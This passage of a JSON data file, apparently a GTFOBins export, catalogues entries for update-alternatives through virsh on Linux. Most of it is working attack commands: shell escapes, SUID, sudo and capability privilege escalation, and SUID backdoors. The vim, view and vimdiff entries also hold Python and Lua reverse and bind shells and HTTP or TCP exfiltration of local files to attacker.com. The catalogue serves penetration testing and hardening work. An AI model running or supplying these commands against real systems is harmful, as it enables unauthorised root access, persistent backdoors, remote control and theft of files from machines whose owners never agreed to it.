        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nWrite in $LFILE a symlink to $TF.\nsudo install -m =xs $(which update-alternatives) .\n\nLFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\n./update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nWrite in $LFILE a symlink to $TF.\nLFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\nsudo update-alternatives --force --install \"$LFILE\" x \"$TF\" 0"
      }
    ]
  },
  {
    "id": 299,
    "bin": "uudecode",
    "url": "/gtfobins/uudecode/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which uudecode) .\n\nLFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode"
      }
    ]
  },
  {
    "id": 300,
    "bin": "uuencode",
    "url": "/gtfobins/uuencode/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which uuencode) .\n\nLFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode"
      }
    ]
  },
  {
    "id": 301,
    "bin": "valgrind",
    "url": "/gtfobins/valgrind/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nvalgrind /bin/sh\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo valgrind /bin/sh"
      }
    ]
  },
  {
    "id": 302,
    "bin": "vi",
    "url": "/gtfobins/vi/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nvi -c ':!/bin/sh' /dev/null\n\n\nvi\n:set shell=/bin/sh\n:shell\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nvi file_to_write\niDATA\n^[\nw\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nvi file_to_read\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo vi -c ':!/bin/sh' /dev/null"
      }
    ]
  },
  {
    "id": 303,
    "bin": "view",
    "url": "/gtfobins/view/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nview -c ':!/bin/sh'\n\n\nview\n:set shell=/bin/sh\n:shell\n\n\nThis requires that view is compiled with Python support. Prepend :py3 for Python 3.\nview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\n\n\nThis requires that view is compiled with Lua support.\nview -c ':lua os.execute(\"reset; exec sh\")'\n\n"
      },
      {
        "func": "Reverse shell",
        "man": "It can send back a reverse shell to a listening attacker to open a remote network access.\n\n\nThis requires that view is compiled with Python support. Prepend :py3 for Python 3. Run socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to receive the shell.\nexport RHOST=attacker.com\nexport RPORT=12345\nview -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'\n\n"
      },
      {
        "func": "Non-interactive reverse shell",
        "man": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.\n\n\nRun nc -l -p 12345 on the attacker box to receive the shell. This requires that view is compiled with Lua support and that lua-socket is installed.\nexport RHOST=attacker.com\nexport RPORT=12345\nview -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'\n\n"
      },
      {
        "func": "Non-interactive bind shell",
        "man": "It can bind a non-interactive shell to a local port to allow remote network access.\n\n\nRun nc target.com 12345 on the attacker box to connect to the shell. This requires that view is compiled with Lua support and that lua-socket is installed.\nexport LPORT=12345\nview -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'\n\n"
      },
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nThis requires that view is compiled with Python support. Prepend :py3 for Python 3. Send local file via \u201cd\u201d parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.\nexport URL=http://attacker.com/\nexport LFILE=file_to_send\nview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'\n\n\nThis requires that view is compiled with Python support. Prepend :py3 for Python 3. Serve files in the local folder running an HTTP server.\nexport LPORT=8888\nview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'\n\n\nSend a local file via TCP. Run nc -l -p 12345 > \"file_to_save\" on the attacker box to collect the file. This requires that view is compiled with Lua support and that lua-socket is installed.\nexport RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nview -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nThis requires that view is compiled with Python support. Prepend :py3 for Python 3. Fetch a remote file via HTTP GET request.\nexport URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'\n\n\nFetch a remote file via TCP. Run nc target.com 12345 < \"file_to_send\" on the attacker box to send the file. This requires that view is compiled with Lua support and that lua-socket is installed.\nexport LPORT=12345\nexport LFILE=file_to_save\nview -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nview file_to_write\niDATA\n^[\nw!\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nview file_to_read\n\n"
      },
      {
        "func": "Library load",
        "man": "It loads shared libraries that may be used to run code in the binary execution context.\n\n\nThis requires that view is compiled with Python support. Prepend :py3 for Python 3.\nview -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nThis requires that view is compiled with Python support. Prepend :py3 for Python 3.\nsudo install -m =xs $(which view) .\n\n./view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo view -c ':!/bin/sh'\n\n\nThis requires that view is compiled with Python support. Prepend :py3 for Python 3.\nsudo view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\n\n\nThis requires that view is compiled with Lua support.\nsudo view -c ':lua os.execute(\"reset; exec sh\")'\n\n"
      },
      {
        "func": "Capabilities",
        "man": "If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.\n\n\nThis requires that view is compiled with Python support. Prepend :py3 for Python 3.\ncp $(which view) .\nsudo setcap cap_setuid+ep view\n\n./view -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nThis requires that view is compiled with Lua support.\nsudo install -m =xs $(which view) .\n\n./view -c ':lua os.execute(\"reset; exec sh\")'"
      }
    ]
  },
  {
    "id": 304,
    "bin": "vigr",
    "url": "/gtfobins/vigr/",
    "funcs": [
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which vigr) .\n\n./vigr\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo vigr"
      }
    ]
  },
  {
    "id": 305,
    "bin": "vim",
    "url": "/gtfobins/vim/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nvim -c ':!/bin/sh'\n\n\nvim --cmd ':set shell=/bin/sh|:shell'\n\n\nThis requires that vim is compiled with Python support. Prepend :py3 for Python 3.\nvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\n\n\nThis requires that vim is compiled with Lua support.\nvim -c ':lua os.execute(\"reset; exec sh\")'\n\n"
      },
      {
        "func": "Reverse shell",
        "man": "It can send back a reverse shell to a listening attacker to open a remote network access.\n\n\nThis requires that vim is compiled with Python support. Prepend :py3 for Python 3. Run socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to receive the shell.\nexport RHOST=attacker.com\nexport RPORT=12345\nvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'\n\n"
      },
      {
        "func": "Non-interactive reverse shell",
        "man": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.\n\n\nRun nc -l -p 12345 on the attacker box to receive the shell. This requires that vim is compiled with Lua support and that lua-socket is installed.\nexport RHOST=attacker.com\nexport RPORT=12345\nvim -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'\n\n"
      },
      {
        "func": "Non-interactive bind shell",
        "man": "It can bind a non-interactive shell to a local port to allow remote network access.\n\n\nRun nc target.com 12345 on the attacker box to connect to the shell. This requires that vim is compiled with Lua support and that lua-socket is installed.\nexport LPORT=12345\nvim -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'\n\n"
      },
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nThis requires that vim is compiled with Python support. Prepend :py3 for Python 3. Send local file via \u201cd\u201d parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.\nexport URL=http://attacker.com/\nexport LFILE=file_to_send\nvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'\n\n\nThis requires that vim is compiled with Python support. Prepend :py3 for Python 3. Serve files in the local folder running an HTTP server.\nexport LPORT=8888\nvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'\n\n\nSend a local file via TCP. Run nc -l -p 12345 > \"file_to_save\" on the attacker box to collect the file. This requires that vim is compiled with Lua support and that lua-socket is installed.\nexport RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nvim -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nThis requires that vim is compiled with Python support. Prepend :py3 for Python 3. Fetch a remote file via HTTP GET request.\nexport URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'\n\n\nFetch a remote file via TCP. Run nc target.com 12345 < \"file_to_send\" on the attacker box to send the file. This requires that vim is compiled with Lua support and that lua-socket is installed.\nexport LPORT=12345\nexport LFILE=file_to_save\nvim -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nvim file_to_write\niDATA\n^[\nw\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nvim file_to_read\n\n"
      },
      {
        "func": "Library load",
        "man": "It loads shared libraries that may be used to run code in the binary execution context.\n\n\nThis requires that vim is compiled with Python support. Prepend :py3 for Python 3.\nvim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nThis requires that vim is compiled with Python support. Prepend :py3 for Python 3.\nsudo install -m =xs $(which vim) .\n\n./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo vim -c ':!/bin/sh'\n\n\nThis requires that vim is compiled with Python support. Prepend :py3 for Python 3.\nsudo vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\n\n\nThis requires that vim is compiled with Lua support.\nsudo vim -c ':lua os.execute(\"reset; exec sh\")'\n\n"
      },
      {
        "func": "Capabilities",
        "man": "If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.\n\n\nThis requires that vim is compiled with Python support. Prepend :py3 for Python 3.\ncp $(which vim) .\nsudo setcap cap_setuid+ep vim\n\n./vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nThis requires that vim is compiled with Lua support.\nsudo install -m =xs $(which vim) .\n\n./vim -c ':lua os.execute(\"reset; exec sh\")'"
      }
    ]
  },
  {
    "id": 306,
    "bin": "vimdiff",
    "url": "/gtfobins/vimdiff/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nvimdiff -c ':!/bin/sh'\n\n\nvimdiff\n:set shell=/bin/sh\n:shell\n\n\nThis requires that vimdiff is compiled with Python support. Prepend :py3 for Python 3.\nvimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\n\n\nThis requires that vimdiff is compiled with Lua support.\nvimdiff -c ':lua os.execute(\"reset; exec sh\")'\n\n"
      },
      {
        "func": "Reverse shell",
        "man": "It can send back a reverse shell to a listening attacker to open a remote network access.\n\n\nThis requires that vimdiff is compiled with Python support. Prepend :py3 for Python 3. Run socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to receive the shell.\nexport RHOST=attacker.com\nexport RPORT=12345\nvimdiff -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'\n\n"
      },
      {
        "func": "Non-interactive reverse shell",
        "man": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.\n\n\nRun nc -l -p 12345 on the attacker box to receive the shell. This requires that vimdiff is compiled with Lua support and that lua-socket is installed.\nexport RHOST=attacker.com\nexport RPORT=12345\nvimdiff -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'\n\n"
      },
      {
        "func": "Non-interactive bind shell",
        "man": "It can bind a non-interactive shell to a local port to allow remote network access.\n\n\nRun nc target.com 12345 on the attacker box to connect to the shell. This requires that vimdiff is compiled with Lua support and that lua-socket is installed.\nexport LPORT=12345\nvimdiff -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'\n\n"
      },
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nThis requires that vimdiff is compiled with Python support. Prepend :py3 for Python 3. Send local file via \u201cd\u201d parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.\nexport URL=http://attacker.com/\nexport LFILE=file_to_send\nvimdiff -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'\n\n\nThis requires that vimdiff is compiled with Python support. Prepend :py3 for Python 3. Serve files in the local folder running an HTTP server.\nexport LPORT=8888\nvimdiff -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'\n\n\nSend a local file via TCP. Run nc -l -p 12345 > \"file_to_save\" on the attacker box to collect the file. This requires that vimdiff is compiled with Lua support and that lua-socket is installed.\nexport RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nvimdiff -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nThis requires that vimdiff is compiled with Python support. Prepend :py3 for Python 3. Fetch a remote file via HTTP GET request.\nexport URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nvimdiff -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'\n\n\nFetch a remote file via TCP. Run nc target.com 12345 < \"file_to_send\" on the attacker box to send the file. This requires that vimdiff is compiled with Lua support and that lua-socket is installed.\nexport LPORT=12345\nexport LFILE=file_to_save\nvimdiff -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nvimdiff file_to_write\niDATA\n^[\nw\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nvimdiff file_to_read\n\n"
      },
      {
        "func": "Library load",
        "man": "It loads shared libraries that may be used to run code in the binary execution context.\n\n\nThis requires that vimdiff is compiled with Python support. Prepend :py3 for Python 3.\nvimdiff -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nThis requires that vimdiff is compiled with Python support. Prepend :py3 for Python 3.\nsudo install -m =xs $(which vimdiff) .\n\n./vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo vimdiff -c ':!/bin/sh'\n\n\nThis requires that vimdiff is compiled with Python support. Prepend :py3 for Python 3.\nsudo vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\n\n\nThis requires that vimdiff is compiled with Lua support.\nsudo vimdiff -c ':lua os.execute(\"reset; exec sh\")'\n\n"
      },
      {
        "func": "Capabilities",
        "man": "If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.\n\n\nThis requires that vimdiff is compiled with Python support. Prepend :py3 for Python 3.\ncp $(which vimdiff) .\nsudo setcap cap_setuid+ep vimdiff\n\n./vimdiff -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nThis requires that vimdiff is compiled with Lua support.\nsudo install -m =xs $(which vimdiff) .\n\n./vimdiff -c ':lua os.execute(\"reset; exec sh\")'"
      }
    ]
  },
  {
    "id": 307,
    "bin": "vipw",
    "url": "/gtfobins/vipw/",
    "funcs": [
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which vipw) .\n\n./vipw\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo vipw"
      }
    ]
  },
  {
    "id": 308,
    "bin": "virsh",
    "url": "/gtfobins/virsh/",
    "funcs": [
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nThis requires the user to be in the libvirt group to perform privileged file write. If the target directory doesn\u2019t exist, pool-create-as must be run with the --build option. The destination file ownership and permissions can be set in the XML.\nLFILE_DIR=/root\nLFILE_NAME=file_to_write\n\necho 'data' > data_to_write\n\nTF=$(mktemp)\ncat > $TF <<EOF\n<volume type='file'>\n  <name>y</name>\n  <key>$LFILE_DIR/$LFILE_NAME</key>\n  <source>\n  </source>\n  <capacity unit='bytes'>5</capacity>\n  <allocation unit='bytes'>4096</allocation>\n  <physical unit='bytes'>5</physical>\n  <target>\n    <path>$LFILE_DIR/$LFILE_NAME</path>\n    <format type='raw'/>\n    <permissions>\n      <mode>0600</mode>\n      <owner>0</owner>\n      <group>0</group>\n    </permissions>\n  </target>\n</volume>\nEOF\n\nvirsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR\nvirsh -c qemu:///system vol-create --pool x --file $TF\nvirsh -c qemu:///system vol-upload --pool x $LFILE_DIR/$LFILE_NAME data_to_write\nvirsh -c qemu:///system pool-destroy x\n\n"
      },
      {
        "func": "File read",
